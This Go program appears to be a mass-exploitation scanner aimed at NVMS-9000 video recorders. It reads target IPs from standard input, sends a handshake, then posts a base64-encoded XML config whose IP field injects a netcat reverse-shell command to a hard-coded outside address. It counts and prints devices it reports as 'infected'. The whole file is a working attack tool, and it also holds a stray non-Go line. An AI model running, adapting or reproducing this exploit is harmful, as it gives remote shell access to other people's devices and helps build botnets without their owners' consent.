package main

import (
    "net"
    "time"
    "bufio"
    "fmt"
    "os"
    "sync"
    "strings"
    //"strconv"
)

#wicked was here hehe

var CONNECT_TIMEOUT time.Duration = 30
var READ_TIMEOUT time.Duration = 15
var WRITE_TIMEOUT time.Duration = 10
var syncWait sync.WaitGroup
var statusAttempted, statusInfected int
var payload string = "AQMhAgEEUAJQAjw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+PHJlcXVlc3QgdmVyc2lvbj0iMS4wIiBzeXN0ZW1UeXBlPSJOVk1TLTkwMDAiIGNsaWVudFR5cGU9IldFQiI+PHR5cGVzPjxmaWx0ZXJUeXBlTW9kZT48ZW51bT5yZWZ1c2U8L2VudW0+PGVudW0+YWxsb3c8L2VudW0+PC9maWx0ZXJUeXBlTW9kZT48YWRkcmVzc1R5cGU+PGVudW0+aXA8L2VudW0+PGVudW0+aXByYW5nZTwvZW51bT48ZW51bT5tYWM8L2VudW0+PC9hZGRyZXNzVHlwZT48L3R5cGVzPjxjb250ZW50Pjxzd2l0Y2g+dHJ1ZTwvc3dpdGNoPjxmaWx0ZXJUeXBlIHR5cGU9ImZpbHRlclR5cGVNb2RlIj5yZWZ1c2U8L2ZpbHRlclR5cGU+PGZpbHRlckxpc3QgdHlwZT0ibGlzdCI+PGl0ZW1UeXBlPjxhZGRyZXNzVHlwZSB0eXBlPSJhZGRyZXNzVHlwZSIvPjwvaXRlbVR5cGU+PGl0ZW0+PHN3aXRjaD50cnVlPC9zd2l0Y2g+PGFkZHJlc3NUeXBlPmlwPC9hZGRyZXNzVHlwZT48aXA+JChuYyR7SUZTfTIwNS4xODUuMTE1LjM5JHtJRlN9MzEzMzcke0lGU30tZSR7SUZTfS9iaW4vc2gmKTwvaXA+PC9pdGVtPjwvZmlsdGVyTGlzdD48L2NvbnRlbnQ+PC9yZXF1ZXN0Pg=="
var superSecretOhYesOhYes string = "{D79E94C5-70F0-46BD-965B-E17497CCB598}"

type scanner_info struct {
	username, password, ip, arch string
	bytebuf []byte
	err error
	resp, authed int
	conn net.Conn
}

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func getStringInBetween(str string, start string, end string) (result string) {

    s := strings.Index(str, start)
    if s == -1 {
        return
    }

    s += len(start)
    e := strings.Index(str, end)

    return str[s:e]
}

func setWriteTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func readUntil(conn net.Conn, read bool, delims ...string) ([]byte, int, error) {

	var line []byte

	if len(delims) == 0 {
		return nil, 0, nil
	}

	p := make([]string, len(delims))
	for i, s := range delims {
		if len(s) == 0 {
			return nil, 0, nil
		}
		p[i] = s
	}

	x := bufio.NewReader(conn)
	for {
		b, err := x.ReadByte()
		if err != nil {
			return nil, 0, err
		}

		if read {
			line = append(line, b)
		}

		for i, s := range p {
			if s[0] == b {
				if len(s) == 1 {
					return line, len(line), nil
				}
				p[i] = s[1:]
			} else {
				p[i] = delims[i]
			}
		}
	}

	return nil, 0, nil
}

func (info *scanner_info) cleanupTarget(close int, conn net.Conn) {

	if close == 1 {
		info.conn.Close()
	}

	zeroByte(info.bytebuf)
	info.username = ""
	info.password = ""
	info.arch = ""
	info.ip = ""
	info.err = nil
	info.resp = 0
	info.authed = 0
}

func processTarget(target string) {

    info := scanner_info {
	    ip: target,
	    username: "",
	    password: "",
	    arch: "",
	    bytebuf: nil,
	    err: nil,
	    resp: 0,
	    authed: 0,
	}

	defer info.cleanupTarget(0, info.conn)
    info.conn, info.err = net.DialTimeout("tcp", info.ip, CONNECT_TIMEOUT * time.Second)
    if info.err != nil {
		syncWait.Done()
		return
    }

    defer info.cleanupTarget(1, info.conn)
    setWriteTimeout(info.conn, WRITE_TIMEOUT)
    info.conn.Write([]byte(superSecretOhYesOhYes))

	setReadTimeout(info.conn, 30)
	info.bytebuf = make([]byte, 256)
	l, err := info.conn.Read(info.bytebuf)
	if err != nil || l <= 0 {
	    syncWait.Done()
	    return
	}


	if strings.Contains(string(info.bytebuf), superSecretOhYesOhYes) {
	    info.conn.Write([]byte("GET /saveSystemConfig HTTP/1.1\r\nAuthorization: Basic\r\nContent-type: text/xml\r\nContent-Length: 801\r\n{D79E94C5-70F0-46BD-965B-E17497CCB598} 2\r\n\r\n" + payload + "\r\n\r\n"))
		statusAttempted++
	}

	setReadTimeout(info.conn, 30)
	info.bytebuf = make([]byte, 256)
	l, err = info.conn.Read(info.bytebuf)
	if err != nil || l <= 0 {
	    syncWait.Done()
	    return
	}

	if strings.Contains(string(info.bytebuf), "200") {
        fmt.Println(info.ip)
		statusInfected++
	}

	zeroByte(info.bytebuf)
    syncWait.Done()
    return
}

func main() {

	var i int = 0
	go func() {
		for {
            fmt.Printf("%d's | Devices found %d | Infection: %d\r\n", i, statusAttempted, statusInfected)
			time.Sleep(1 * time.Second)
			i++
		}
	} ()

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            if os.Args[1] == "listen" {
        		go processTarget(scan.Text())
        	} else {
        		go processTarget(scan.Text() + ":" + os.Args[1])
        	}
            syncWait.Add(1)
        }
    }
}
